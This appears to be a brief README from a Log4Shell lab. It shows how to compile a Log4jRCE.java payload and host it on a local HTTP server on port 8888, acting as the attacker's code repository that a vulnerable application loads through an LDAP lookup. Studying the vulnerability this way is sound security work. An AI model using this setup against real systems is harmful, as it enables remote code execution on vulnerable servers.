## This is to emulate the remote code repository which hosts attacker codes.
## These codes are then downloaded & serialized by the vulnerable application via LDAP lookup up

1. Compile Log4jRCE.java
<pre>
$ javac Log4jRCE.java

$ ls
-rw-r--r-- 1 rafsyam 197121 1.7K Feb 22 03:54 Log4jRCE.class
</pre>

2. Run a simple http server to host the code at port 8888
<pre>
$ ./run-server.sh
Serving HTTP on :: port 8888 (http://[::]:8888/) ...
</pre>